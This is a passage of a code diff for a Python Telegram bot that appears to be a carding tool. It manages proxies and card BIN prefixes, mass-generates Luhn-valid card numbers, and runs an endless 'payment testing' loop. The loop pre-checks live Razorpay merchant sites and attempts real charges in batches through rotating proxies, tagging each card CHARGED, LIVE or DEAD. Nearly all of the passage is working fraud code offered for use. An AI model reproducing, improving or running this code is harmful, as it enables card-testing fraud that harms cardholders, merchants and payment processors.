-            results.append(f"  {e('live')} <code>{safe(raw[:35])}</code>\n     └ {safe(info)} | <code>{lat}ms</code>")
+            live += 1
+            results.append(
+                f"  {e('live')} <code>{safe(raw[:40])}</code>  {lat}ms\n"
+                f"     └ {safe(detail)}")
         else:
-            bad += 1
-            results.append(f"  {e('offline')} <code>{safe(raw[:35])}</code>\n     └ {safe(info)}")
-
-    text = (
-        f"{e('proxy')} <b>Proxy Test Results</b>\n\n"
-        + "\n\n".join(results)
-        + f"\n\n{e('check')} Live: <code>{good}</code>  {e('cross')} Dead: <code>{bad}</code>"
-    )
-    await msg.edit_text(text, parse_mode=ParseMode.HTML)
+            dead += 1
+            results.append(
+                f"  {e('offline')} <code>{safe(raw[:40])}</code>  DEAD\n"
+                f"     └ {safe(detail)}")
+    await msg.edit_text(
+        f"{e('proxy')} <b>Proxy Test Results</b>  "
+        f"{e('live')}{live} live  {e('offline')}{dead} dead\n\n"
+        + "\n\n".join(results),
+        parse_mode=ParseMode.HTML)
 
 
 @require_auth
-async def cmd_rmpxy(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+async def cmd_rmpxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     proxies = await redis.lrange(RK_PROXIES, 0, -1)
     if not proxies:
-        await update.message.reply_text(
-            f"{e('error')} No proxies to remove.", parse_mode=ParseMode.HTML)
+        await update.message.reply_text(f"{e('error')} No proxies.", parse_mode=ParseMode.HTML)
         return
-    if context.args:
+    if ctx.args:
         try:
-            idx = int(context.args[0]) - 1
+            idx = int(ctx.args[0]) - 1
             if 0 <= idx < len(proxies):
                 await redis.lrem(RK_PROXIES, 1, proxies[idx])
                 await update.message.reply_text(
-                    f"{e('check')} Removed proxy <code>#{idx+1}</code>.",
-                    parse_mode=ParseMode.HTML)
-            else:
-                await update.message.reply_text(
-                    f"{e('error')} Index out of range.", parse_mode=ParseMode.HTML)
+                    f"{e('check')} Proxy removed.", parse_mode=ParseMode.HTML)
             return
         except ValueError:
             pass
-
-    keyboard = []
-    for idx, proxy in enumerate(proxies):
-        short = (proxy[:40] + "…") if len(proxy) > 40 else proxy
-        keyboard.append([btn(f"🗑 {short}", f"rmpxy_{idx}")])
-    keyboard.append([btn(f"{e('cross')} Cancel", "cancel")])
+    kb = [[btn(f"🗑 {(p[:40]+'…') if len(p)>40 else p}", f"rm_pxy_{i}")]
+          for i, p in enumerate(proxies)]
+    kb.append([btn("❌ Cancel", "cancel")])
     await update.message.reply_text(
-        f"{e('tool')} <b>Select proxy to remove:</b>",
+        f"{e('tool')} Select proxy to remove:",
         parse_mode=ParseMode.HTML,
-        reply_markup=InlineKeyboardMarkup(keyboard))
+        reply_markup=InlineKeyboardMarkup(kb))
 
 
 @require_auth
-async def cmd_clrpxy(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Clear all proxies."""
+async def cmd_clrpxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     await redis.delete(RK_PROXIES)
-    await update.message.reply_text(
-        f"{e('check')} All proxies cleared.", parse_mode=ParseMode.HTML)
+    await update.message.reply_text(f"{e('check')} All proxies cleared.", parse_mode=ParseMode.HTML)
 
 
-
-# ═══════════════════════════════════════════════════
-#           BIN MANAGEMENT
-# ═══════════════════════════════════════════════════
-
+# ══════════════════════════════════════════════════
+#   BIN MANAGEMENT
+# ══════════════════════════════════════════════════
 @require_auth
-async def cmd_addbim(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    if not context.args:
+async def cmd_addbim(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
+    if not ctx.args:
         await update.message.reply_text(
-            f"{e('error')} <b>Usage:</b> <code>/addbim BIN1 BIN2 …</code>\n"
-            f"<b>Examples:</b> <code>/addbim 411111  5xxxxx|12|25|rnd</code>",
+            f"{e('error')} Usage: <code>/addbim BIN1 BIN2 …</code>\n"
+            f"Example: <code>/addbim 411111  5xxxxx|12|28|rnd</code>",
             parse_mode=ParseMode.HTML)
         return
     existing = set(await redis.lrange(RK_BINS, 0, -1))
     added = bad = dupe = 0
-    for bp in context.args:
+    for bp in ctx.args:
         ok, err = validate_bin(bp)
         if not ok:
             bad += 1
@@ -1193,832 +1058,753 @@ async def cmd_addbim(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None
 
 
 @require_auth
-async def cmd_chkbim(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+async def cmd_chkbim(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     bins = await redis.lrange(RK_BINS, 0, -1)
     if not bins:
         await update.message.reply_text(
-            f"{e('error')} No BINs loaded. Use <code>/addbim</code>.",
-            parse_mode=ParseMode.HTML)
+            f"{e('error')} No BINs. Use /addbim.", parse_mode=ParseMode.HTML)
         return
     lines = "\n".join(f"  {i}. <code>{safe(b)}</code>" for i, b in enumerate(bins, 1))
     await update.message.reply_text(
-        f"{e('bin')} <b>BINs ({len(bins)})</b>\n\n{lines}",
-        parse_mode=ParseMode.HTML)
+        f"{e('bin')} <b>BINs ({len(bins)})</b>\n\n{lines}", parse_mode=ParseMode.HTML)
 
 
 @require_auth
-async def cmd_rmbin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+async def cmd_rmbin(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     bins = await redis.lrange(RK_BINS, 0, -1)
     if not bins:
-        await update.message.reply_text(
-            f"{e('error')} No BINs to remove.", parse_mode=ParseMode.HTML)
+        await update.message.reply_text(f"{e('error')} No BINs.", parse_mode=ParseMode.HTML)
         return
-    if context.args:
+    if ctx.args:
         try:
-            idx = int(context.args[0]) - 1
+            idx = int(ctx.args[0]) - 1
             if 0 <= idx < len(bins):
                 await redis.lrem(RK_BINS, 1, bins[idx])
                 await update.message.reply_text(
-                    f"{e('check')} Removed BIN: <code>{safe(bins[idx])}</code>",
-                    parse_mode=ParseMode.HTML)
-            else:
-                await update.message.reply_text(
-                    f"{e('error')} Index out of range.", parse_mode=ParseMode.HTML)
+                    f"{e('check')} BIN removed.", parse_mode=ParseMode.HTML)
             return
         except ValueError:
             pass
-    keyboard = []
-    for idx, b in enumerate(bins):
-        keyboard.append([btn(f"🗑 {b}", f"rmbin_{idx}")])
-    keyboard.append([btn(f"{e('cross')} Cancel", "cancel")])
+    kb = [[btn(f"🗑 {b}", f"rm_bin_{i}")] for i, b in enumerate(bins)]
+    kb.append([btn("❌ Cancel", "cancel")])
     await update.message.reply_text(
         f"{e('tool')} Select BIN to remove:",
-        parse_mode=ParseMode.HTML,
-        reply_markup=InlineKeyboardMarkup(keyboard))
+        parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))
 
 
 @require_auth
-async def cmd_binlookup(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """BIN lookup via binlist.net."""
-    if not context.args:
+async def cmd_binlookup(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
+    if not ctx.args:
         await update.message.reply_text(
-            f"{e('error')} <b>Usage:</b> <code>/binlookup 411111</code>",
-            parse_mode=ParseMode.HTML)
+            f"{e('error')} Usage: <code>/binlookup 411111</code>", parse_mode=ParseMode.HTML)
         return
-    bin6 = context.args[0][:8]
-    msg  = await update.message.reply_text(
-        f"{e('loading')} Looking up BIN <code>{safe(bin6)}</code>…",
-        parse_mode=ParseMode.HTML)
-    info = await lookup_bin(bin6)
+    b6  = ctx.args[0][:8]
+    msg = await update.message.reply_text(
+        f"{e('loading')} Looking up BIN <code>{safe(b6)}</code>…", parse_mode=ParseMode.HTML)
+    info = await lookup_bin(b6)
     await msg.edit_text(
-        f"{e('bin')} <b>BIN Lookup: <code>{safe(bin6)}</code></b>\n\n"
-        f"  {e('card')} Scheme:  <code>{info['scheme']}</code>\n"
-        f"  {e('star')} Type:    <code>{info['type']}</code>\n"
-        f"  {e('diamond')} Brand:  <code>{info['brand'] or 'N/A'}</code>\n"
-        f"  {e('money')} Bank:    <code>{safe(info['bank'])}</code>\n"
-        f"  {e('location')} Country: <code>{safe(info['country'])}</code> {info['emoji']}",
+        f"{e('bin')} <b>BIN: <code>{safe(b6)}</code></b>\n\n"
+        f"  {e('card')}     Scheme:  <code>{info['scheme']}</code>\n"
+        f"  {e('star')}     Type:    <code>{info['type']}</code>\n"
+        f"  {e('diamond')}  Brand:   <code>{info['brand'] or 'N/A'}</code>\n"
+        f"  {e('money')}    Bank:    <code>{safe(info['bank'])}</code>\n"
+        f"  {e('location')} Country: <code>{safe(info['country'])}</code> {info['flag']}",
         parse_mode=ParseMode.HTML)
 
 
-
-# ═══════════════════════════════════════════════════
-#      PAYMENT TESTING  (real, batched)
-# ═══════════════════════════════════════════════════
-
+# ══════════════════════════════════════════════════
+#   PAYMENT TESTING
+#   - Single status message, edited continuously
+#   - 25 cards per batch
+#   - Continuous until /stop
+#   - Result lines sent to chat (not editing — too long)
+# ══════════════════════════════════════════════════
 @require_auth
-async def cmd_fuck(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Launch payment testing workflow."""
+async def cmd_fuck(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     sites = await redis.lrange(RK_SITES, 0, -1)
     bins  = await redis.lrange(RK_BINS,  0, -1)
     if not sites:
         await update.message.reply_text(
-            f"{e('error')} No sites loaded. Use <code>/addsite</code> first.",
-            parse_mode=ParseMode.HTML)
+            f"{e('error')} No sites. Add with /addsite.", parse_mode=ParseMode.HTML)
         return
     if not bins:
         await update.message.reply_text(
-            f"{e('error')} No BINs loaded. Use <code>/addbim</code> first.",
-            parse_mode=ParseMode.HTML)
+            f"{e('error')} No BINs. Add with /addbim.", parse_mode=ParseMode.HTML)
         return
 
-    keyboard = InlineKeyboardMarkup([
-        [btn("₹1  — Micro",  "test_100"),
-         btn("₹5  — Small",  "test_500")],
-        [btn("₹10 — Basic",  "test_1000"),
-         btn("₹50 — Medium", "test_5000")],
-        [btn("₹100 — High",  "test_10000")],
-        [btn(f"{e('cross')} Cancel", "cancel")],
-    ])
-
     proxies = await redis.llen(RK_PROXIES)
+    # Use plain text amount labels in buttons (no HTML/emoji IDs)
+    kb = InlineKeyboardMarkup([
+        [btn("₹1",   "test_100"),  btn("₹5",   "test_500")],
+        [btn("₹10",  "test_1000"), btn("₹50",  "test_5000")],
+        [btn("₹100", "test_10000")],
+        [btn("❌ Cancel", "cancel")],
+    ])
     await update.message.reply_text(
         f"{e('fire')} <b>Payment Testing</b>\n\n"
-        f"  {e('site')} Sites:   <code>{len(sites)}</code>\n"
-        f"  {e('bin')} BINs:    <code>{len(bins)}</code>\n"
-        f"  {e('proxy')} Proxies: <code>{proxies}</code>\n\n"
-        f"{e('money')} <b>Select test amount (INR):</b>",
-        parse_mode=ParseMode.HTML,
-        reply_markup=keyboard)
+        f"  {e('site')}  Sites:   <code>{len(sites)}</code>\n"
+        f"  {e('bin')}   BINs:    <code>{len(bins)}</code>\n"
+        f"  {e('proxy')} Proxies: <code>{proxies}</code>\n"
+        f"  {e('mass')}  Batch:   <code>{BATCH_SIZE} cards</code>\n\n"
+        f"{e('money')} <b>Select amount (INR):</b>",
+        parse_mode=ParseMode.HTML, reply_markup=kb)
 
 
-async def run_payment_test(
-    chat_id: int,
-    amount_paise: int,
-    context: ContextTypes.DEFAULT_TYPE,
-) -> None:
+async def run_payment_test(chat_id: int, amount_paise: int,
+                            ctx: ContextTypes.DEFAULT_TYPE) -> None:
     """
-    Real batched Razorpay payment testing.
-    Batches: BATCH_SIZE cards per batch, BATCH_DELAY between batches.
-    Max 10 batches per run.
+    Continuous batching:
+    - Pre-check all sites, keep only live+Razorpay ones
+    - Generate 25 cards at a time, test them all
+    - Edit one persistent status message with running counters
+    - Send batch result lines as a single chat message per batch
+    - Loop until /stop or no more BINs
     """
-    MAX_BATCHES = 10
-
     sites   = await redis.lrange(RK_SITES,   0, -1)
     bins    = await redis.lrange(RK_BINS,     0, -1)
     proxies = await redis.lrange(RK_PROXIES,  0, -1)
 
     if not sites or not bins:
-        await context.bot.send_message(
-            chat_id, f"{e('error')} Missing sites or BINs.", parse_mode=ParseMode.HTML)
+        await ctx.bot.send_message(chat_id, f"{e('error')} Missing sites or BINs.",
+                                   parse_mode=ParseMode.HTML)
         return
 
-    # Generate cards — 1 per BIN, up to BATCH_SIZE * MAX_BATCHES
-    max_cards = min(BATCH_SIZE * MAX_BATCHES, len(bins) * 3)
-    cards: List[str] = []
-    for bp in bins:
-        for card in generate_cards_streaming(bp, min(3, max(1, max_cards // len(bins)))):
-            cards.append(card)
-            if len(cards) >= max_cards:
-                break
-        if len(cards) >= max_cards:
-            break
+    amt_inr = amount_paise // 100
 
-    if not cards:
-        await context.bot.send_message(
-            chat_id, f"{e('error')} Could not generate cards from BINs.",
-            parse_mode=ParseMode.HTML)
-        return
-
-    batches = [cards[i:i+BATCH_SIZE] for i in range(0, len(cards), BATCH_SIZE)]
-    batches = batches[:MAX_BATCHES]
-    amt_inr  = amount_paise // 100
-
-    status_msg = await context.bot.send_message(
+    # ── PRE-CHECK SITES ──────────────────────────
+    status_msg = await ctx.bot.send_message(
         chat_id,
-        f"{e('cooking')} <b>Payment Test Started</b>\n\n"
-        f"  {e('money')} Amount:  <code>₹{amt_inr}</code>\n"
-        f"  {e('card')} Cards:   <code>{len(cards)}</code>\n"
-        f"  {e('site')} Sites:   <code>{len(sites)}</code>\n"
-        f"  {e('mass')} Batches: <code>{len(batches)}</code> × {BATCH_SIZE}\n"
-        f"  {e('proxy')} Proxies: <code>{len(proxies)}</code>\n\n"
-        f"{e('loading')} Testing…",
-        parse_mode=ParseMode.HTML,
-    )
+        f"{e('search')} <b>Pre-checking sites…</b>",
+        parse_mode=ParseMode.HTML)
 
-    # Register as active
-    active_tests[chat_id] = True
-
-    total_ok = total_charged = total_fail = 0
-    processed = 0
-
-    # First do a site liveness pre-check
     live_sites: List[Tuple[str, str]] = []
     for site in sites:
-        proxy_url = get_random_proxy_url(proxies)
-        is_live, rzp_key, _ = await check_site_live(site, proxy_url)
-        if is_live:
-            live_sites.append((site, rzp_key))
+        purl = get_random_proxy_url(proxies)
+        ok, key, _ = await check_site_live(site, purl)
+        if ok:
+            live_sites.append((site, key))
 
     if not live_sites:
         await status_msg.edit_text(
-            f"{e('offline')} <b>No live Razorpay sites found!</b>\n\n"
-            f"All {len(sites)} site(s) failed liveness check.\n"
-            f"Add working sites with /addsite.",
+            f"{e('offline')} <b>No live Razorpay sites found.</b>\n"
+            f"Checked {len(sites)} site(s). Add working sites with /addsite.",
             parse_mode=ParseMode.HTML)
-        active_tests.pop(chat_id, None)
         return
 
-    await context.bot.send_message(
-        chat_id,
-        f"{e('live')} <b>{len(live_sites)}/{len(sites)} sites live</b>\n"
-        + "\n".join(f"  {e('check')} <code>{safe(s[0][:55])}</code>" for s in live_sites),
-        parse_mode=ParseMode.HTML,
-    )
+    await status_msg.edit_text(
+        f"{e('live')} {len(live_sites)}/{len(sites)} sites live — starting test…",
+        parse_mode=ParseMode.HTML)
 
-    for b_idx, batch in enumerate(batches, 1):
-        if not active_tests.get(chat_id):
-            await context.bot.send_message(
-                chat_id, f"{e('stop')} Test stopped by user.", parse_mode=ParseMode.HTML)
-            break
+    # ── RUN ───────────────────────────────────────
+    active_tests[chat_id] = True
+    charged = live_ok = dead = batch_n = 0
 
-        batch_results: List[str] = []
+    def _status_text():
+        return (
+            f"{e('cooking')} <b>Testing — ₹{amt_inr}</b>\n\n"
+            f"  {e('mass')}    Batch:    <code>#{batch_n}</code>\n"
+            f"  {e('success')} Charged:  <code>{charged}</code>\n"
+            f"  {e('approved')} Live:    <code>{live_ok}</code>\n"
+            f"  {e('declined')} Dead:    <code>{dead}</code>\n"
+            f"  {e('site')}   Sites:    <code>{len(live_sites)}</code> live\n\n"
+            f"{e('tds')} Running… use /stop to halt"
+        )
 
-        for card in batch:
+    # Infinite loop — keep pulling 25 cards from random BINs
+    while active_tests.get(chat_id):
+        batch_n += 1
+        bp = random.choice(bins)
+        batch_cards = list(gen_cards(bp, BATCH_SIZE))
+        if not batch_cards:
+            continue
+
+        try:
+            await status_msg.edit_text(_status_text(), parse_mode=ParseMode.HTML)
+        except Exception:
+            pass
+
+        result_lines: List[str] = []
+        for card in batch_cards:
             if not active_tests.get(chat_id):
                 break
-
             site_url, rzp_key = random.choice(live_sites)
-            proxy_url = get_random_proxy_url(proxies)
-
-            result = await attempt_razorpay_payment(
-                site_url, rzp_key, card, amount_paise, proxy_url)
-
-            processed += 1
+            purl = get_random_proxy_url(proxies)
+            res  = await attempt_payment(site_url, rzp_key, card, amount_paise, purl)
             await redis.incr("bot:stats:total_payments")
 
-            if result["success"] and result["charge"]:
-                total_charged += 1
-                icon = e('success')
-                tag  = "CHARGED"
-            elif result["success"]:
-                total_ok += 1
-                icon = e('approved')
-                tag  = "LIVE"
+            if res["success"] and res["charge"]:
+                charged += 1
+                icon, tag = e("success"), "CHARGED"
+            elif res["success"]:
+                live_ok += 1
+                icon, tag = e("approved"), "LIVE"
             else:
-                total_fail += 1
-                icon = e('declined')
-                tag  = "DEAD"
+                dead += 1
+                icon, tag = e("declined"), "DEAD"
 
-            batch_results.append(
+            result_lines.append(
                 f"{icon} <b>{tag}</b>  <code>{card}</code>\n"
-                f"     {e('gateway')} {safe(site_url[:50])}\n"
-                f"     {e('info')} {safe(result['response'][:70])} "
-                f"[<code>{result['code']}</code>] {e('time')}{result.get('timestamp','')}"
+                f"   {e('gateway')} {safe(site_url[:55])}\n"
+                f"   {e('info')} {safe(res['resp'][:70])}  <code>{res['code']}</code>  {e('time')}{res.get('ts','')}"
             )
 
-        if batch_results:
-            batch_text = (
-                f"{e('mass')} <b>Batch {b_idx}/{len(batches)}</b>  "
-                f"({e('live')}{total_ok+total_charged} live | "
-                f"{e('declined')}{total_fail} dead)\n\n"
-                + "\n\n".join(batch_results)
-            )
-            await context.bot.send_message(chat_id, batch_text, parse_mode=ParseMode.HTML)
+        # Send batch results as one chat message (not editing status)
+        if result_lines:
+            try:
+                await ctx.bot.send_message(
+                    chat_id,
+                    f"{e('mass')} <b>Batch #{batch_n}</b>  "
+                    f"[{e('success')}{charged} {e('approved')}{live_ok} {e('declined')}{dead}]\n\n"
+                    + "\n\n".join(result_lines),
+                    parse_mode=ParseMode.HTML)
+            except Exception:
+                pass
 
-        if b_idx < len(batches) and active_tests.get(chat_id):
+        if active_tests.get(chat_id):
             await asyncio.sleep(BATCH_DELAY)
 
     active_tests.pop(chat_id, None)
-
-    await status_msg.edit_text(
-        f"{e('trophy')} <b>Payment Test Complete</b>\n\n"
-        f"  {e('card')} Tested:   <code>{processed}</code>\n"
-        f"  {e('success')} Charged:  <code>{total_charged}</code>\n"
-        f"  {e('approved')} Live:     <code>{total_ok}</code>\n"
-        f"  {e('declined')} Dead:     <code>{total_fail}</code>\n"
-        f"  {e('money')} Amount:   <code>₹{amt_inr}</code>\n"
-        f"  {e('mass')} Batches:  <code>{len(batches)}</code>",
-        parse_mode=ParseMode.HTML,
-    )
+    try:
+        await status_msg.edit_text(
+            f"{e('stop')} <b>Test Stopped</b>\n\n"
+            f"  {e('mass')}    Batches:  <code>{batch_n}</code>\n"
+            f"  {e('success')} Charged:  <code>{charged}</code>\n"
+            f"  {e('approved')} Live:    <code>{live_ok}</code>\n"
+            f"  {e('declined')} Dead:    <code>{dead}</code>\n"
+            f"  {e('money')}   Amount:   <code>₹{amt_inr}</code>",
+            parse_mode=ParseMode.HTML)
+    except Exception:
+        pass
 
 
 @require_auth
-async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Stop an active payment test."""
+async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     cid = update.effective_chat.id
     if active_tests.get(cid):
         active_tests[cid] = False
         await update.message.reply_text(
-            f"{e('stop')} Stopping active test…", parse_mode=ParseMode.HTML)
+            f"{e('stop')} Stopping…", parse_mode=ParseMode.HTML)
     else:
         await update.message.reply_text(
-            f"{e('info')} No active test running.", parse_mode=ParseMode.HTML)
+            f"{e('info')} No active test.", parse_mode=ParseMode.HTML)
 
 
-
-# ═══════════════════════════════════════════════════
-#          /gen  — card generation (public with rate limit)
-# ═══════════════════════════════════════════════════
-
-async def cmd_gen(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+# ══════════════════════════════════════════════════
+#   /gen  — card generation
+# ══════════════════════════════════════════════════
+async def cmd_gen(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     uid = update.effective_user.id
-
-    # Auth check — only authorized users may generate
     if not await is_authorized(uid):
-        await update.message.reply_text(
-            f"{e('lock')} Restricted.", parse_mode=ParseMode.HTML)
+        await update.message.reply_text(f"{e('lock')} Restricted.", parse_mode=ParseMode.HTML)
         return
-
-    ok, msg_rl = check_rate_limit(uid)
+    ok, rl = check_rate_limit(uid)
     if not ok:
-        await update.message.reply_text(
-            f"{e('cooldown')} {msg_rl}", parse_mode=ParseMode.HTML)
+        await update.message.reply_text(f"{e('cooldown')} {rl}", parse_mode=ParseMode.HTML)
         return
-
-    if not context.args:
+    if not ctx.args:
         await update.message.reply_text(
             f"{e('card')} <b>Usage:</b> <code>/gen BIN amount</code>\n"
-            f"<b>Example:</b> <code>/gen 411111 100</code>",
+            f"Example: <code>/gen 411111 100</code>",
             parse_mode=ParseMode.HTML)
         return
-
-    bin_pattern = context.args[0]
+    bp = ctx.args[0]
     try:
-        amount = int(context.args[1]) if len(context.args) > 1 else 10
+        amt = int(ctx.args[1]) if len(ctx.args) > 1 else 10
     except ValueError:
-        await update.message.reply_text(
-            f"{e('error')} Amount must be a number.", parse_mode=ParseMode.HTML)
+        await update.message.reply_text(f"{e('error')} Amount must be a number.", parse_mode=ParseMode.HTML)
         return
-
-    if amount < 1 or amount > MAX_LIMIT:
-        await update.message.reply_text(
-            f"{e('error')} Amount must be 1–{MAX_LIMIT:,}.", parse_mode=ParseMode.HTML)
+    if amt < 1 or amt > MAX_LIMIT:
+        await update.message.reply_text(f"{e('error')} 1–{MAX_LIMIT:,} only.", parse_mode=ParseMode.HTML)
         return
-
-    ok2, err = validate_bin(bin_pattern)
+    ok2, err = validate_bin(bp)
     if not ok2:
-        await update.message.reply_text(
-            f"{e('error')} {err}", parse_mode=ParseMode.HTML)
+        await update.message.reply_text(f"{e('error')} {err}", parse_mode=ParseMode.HTML)
         return
 
-    # BIN info lookup
-    bin6 = bin_pattern.split("|")[0][:8]
-    bin_info = await lookup_bin(bin6)
-
-    status = await update.message.reply_text(
-        f"{e('loading')} <b>Generating {amount:,} cards…</b>\n"
-        f"  {e('bin')} BIN: <code>{safe(bin6)}</code>  {bin_info['scheme']} | {safe(bin_info['bank'])} | {safe(bin_info['country'])} {bin_info['emoji']}",
+    b6 = bp.split("|")[0][:8]
+    bin_info = await lookup_bin(b6)
+    stat = await update.message.reply_text(
+        f"{e('loading')} <b>Generating {amt:,} cards…</b>\n"
+        f"  {e('bin')} <code>{safe(b6)}</code>  "
+        f"{bin_info['scheme']} | {safe(bin_info['bank'])} | {safe(bin_info['country'])} {bin_info['flag']}",
         parse_mode=ParseMode.HTML)
 
-    bin_display  = bin_pattern.split("|")[0]
-    file_count   = 0
-    cards_count  = 0
-    current_chunk: List[str] = []
-
+    bd = bp.split("|")[0]
+    fc = cc = 0
+    chunk: List[str] = []
     try:
-        for card in generate_cards_streaming(bin_pattern, amount):
-            current_chunk.append(card)
-            cards_count += 1
-
-            if len(current_chunk) >= MAX_LINES_PER_FILE:
-                file_count += 1
-                bio = BytesIO("\n".join(current_chunk).encode())
-                bio.name = f"gen_{bin_display}_p{file_count}.txt"
+        for card in gen_cards(bp, amt):
+            chunk.append(card)
+            cc += 1
+            if len(chunk) >= MAX_LINES_PER_FILE:
+                fc += 1
+                bio = BytesIO("\n".join(chunk).encode())
+                bio.name = f"gen_{bd}_p{fc}.txt"
                 bio.seek(0)
-                await _send_doc(update.message, bio, file_count, len(current_chunk))
-                current_chunk = []
+                await _send_doc(update.message, bio, fc, len(chunk))
+                chunk = []
                 await asyncio.sleep(SEND_DELAY)
-
-        if current_chunk:
-            file_count += 1
-            bio = BytesIO("\n".join(current_chunk).encode())
-            bio.name = f"gen_{bin_display}_p{file_count}.txt"
+        if chunk:
+            fc += 1
+            bio = BytesIO("\n".join(chunk).encode())
+            bio.name = f"gen_{bd}_p{fc}.txt"
             bio.seek(0)
-            await _send_doc(update.message, bio, file_count, len(current_chunk))
+            await _send_doc(update.message, bio, fc, len(chunk))
 
-        # Update stats
-        await redis.hset(RK_STATS, "total_generated",
-            str(int(await redis.hget(RK_STATS, "total_generated") or 0) + cards_count))
+        cur = int(await redis.hget(RK_STATS, "total_generated") or 0)
+        await redis.hset(RK_STATS, "total_generated", str(cur + cc))
 
-        await status.edit_text(
-            f"{e('success')} <b>Generated {cards_count:,} cards in {file_count} file(s)</b>\n"
-            f"  {e('bin')} BIN: <code>{safe(bin_display)}</code>\n"
-            f"  {e('card')} Scheme: <code>{bin_info['scheme']}</code>  |  "
-            f"{e('money')} Bank: <code>{safe(bin_info['bank'])}</code>\n"
-            f"  {e('location')} Country: <code>{safe(bin_info['country'])}</code> {bin_info['emoji']}",
+        await stat.edit_text(
+            f"{e('success')} <b>Generated {cc:,} cards in {fc} file(s)</b>\n"
+            f"  {e('bin')}  BIN:     <code>{safe(bd)}</code>\n"
+            f"  {e('card')} Scheme:  <code>{bin_info['scheme']}</code>\n"
+            f"  {e('money')} Bank:   <code>{safe(bin_info['bank'])}</code>\n"
+            f"  {e('location')} Country: <code>{safe(bin_info['country'])}</code> {bin_info['flag']}",
             parse_mode=ParseMode.HTML)
-
     except Exception as ex:
-        logger.exception("gen error")
-        await status.edit_text(
-            f"{e('error')} Generation failed: {safe(str(ex)[:100])}",
-            parse_mode=ParseMode.HTML)
+        await stat.edit_text(
+            f"{e('error')} Generation failed: {safe(str(ex)[:100])}", parse_mode=ParseMode.HTML)
 
 
-async def _send_doc(message, bio: BytesIO, part: int, count: int) -> None:
-    """Send document with retry."""
-    cap = (
-        f"{e('check')} <b>Part {part}</b> — {count:,} cards\n"
-        f"  {e('fire')} Luhn-valid • Future expiry"
-    )
+async def _send_doc(msg, bio: BytesIO, part: int, count: int) -> None:
+    cap = f"{e('check')} <b>Part {part}</b> — {count:,} cards  {e('fire')} Luhn-valid"
     for attempt in range(2):
         try:
             bio.seek(0)
-            await message.reply_document(document=bio, caption=cap, parse_mode=ParseMode.HTML)
+            await msg.reply_document(document=bio, caption=cap, parse_mode=ParseMode.HTML)
             return
         except Exception as ex:
-            logger.error(f"Doc send attempt {attempt+1} failed: {ex}")
+            logger.error(f"Doc send #{attempt+1}: {ex}")
             if attempt == 0:
                 await asyncio.sleep(1.5)
 
 
-# ═══════════════════════════════════════════════════
-#          /split — file splitting (public)
-# ═══════════════════════════════════════════════════
-
-async def cmd_split(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+# ══════════════════════════════════════════════════
+#   /split
+# ══════════════════════════════════════════════════
+async def cmd_split(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     uid = update.effective_user.id
     if not await is_authorized(uid):
-        await update.message.reply_text(
-            f"{e('lock')} Restricted.", parse_mode=ParseMode.HTML)
+        await update.message.reply_text(f"{e('lock')} Restricted.", parse_mode=ParseMode.HTML)
         return
-
-    ok, msg_rl = check_rate_limit(uid)
+    ok, rl = check_rate_limit(uid)
     if not ok:
-        await update.message.reply_text(
-            f"{e('cooldown')} {msg_rl}", parse_mode=ParseMode.HTML)
+        await update.message.reply_text(f"{e('cooldown')} {rl}", parse_mode=ParseMode.HTML)
         return
-
-    if not context.args:
+    if not ctx.args:
         await update.message.reply_text(
-            f"{e('mass')} <b>Usage:</b> Reply to a .txt file with <code>/split 5</code>",
-            parse_mode=ParseMode.HTML)
+            f"{e('mass')} Reply to a .txt file: <code>/split 5</code>", parse_mode=ParseMode.HTML)
         return
-
     try:
-        parts_count = int(context.args[0])
+        n = int(ctx.args[0])
     except ValueError:
-        await update.message.reply_text(
-            f"{e('error')} Parts must be a number.", parse_mode=ParseMode.HTML)
+        await update.message.reply_text(f"{e('error')} Number required.", parse_mode=ParseMode.HTML)
         return
-
-    if parts_count < 2 or parts_count > MAX_SPLIT_PARTS:
+    if n < 2 or n > MAX_SPLIT_PARTS:
         await update.message.reply_text(
-            f"{e('error')} Parts must be 2–{MAX_SPLIT_PARTS}.", parse_mode=ParseMode.HTML)
+            f"{e('error')} 2–{MAX_SPLIT_PARTS} parts.", parse_mode=ParseMode.HTML)
         return
-
-    replied = update.message.reply_to_message
-    if not replied or not replied.document:
+    rep = update.message.reply_to_message
+    if not rep or not rep.document:
         await update.message.reply_text(
-            f"{e('error')} Reply to a <code>.txt</code> file with this command.",
-            parse_mode=ParseMode.HTML)
+            f"{e('error')} Reply to a .txt file.", parse_mode=ParseMode.HTML)
         return
-
-    doc = replied.document
-    filename = doc.file_name or "file.txt"
-    if not filename.lower().endswith(".txt"):
+    doc = rep.document
+    fn = doc.file_name or "file.txt"
+    if not fn.lower().endswith(".txt"):
         await update.message.reply_text(
-            f"{e('error')} Only <code>.txt</code> files supported.",
-            parse_mode=ParseMode.HTML)
+            f"{e('error')} Only .txt files.", parse_mode=ParseMode.HTML)
         return
-
-    status = await update.message.reply_text(
-        f"{e('loading')} Downloading file…", parse_mode=ParseMode.HTML)
-
+    stat = await update.message.reply_text(
+        f"{e('loading')} Downloading…", parse_mode=ParseMode.HTML)
     try:
         buf = BytesIO()
-        tgfile = await doc.get_file()
-        await tgfile.download_to_memory(out=buf)
+        tf  = await doc.get_file()
+        await tf.download_to_memory(out=buf)
         buf.seek(0)
         try:
             content = buf.read().decode("utf-8")
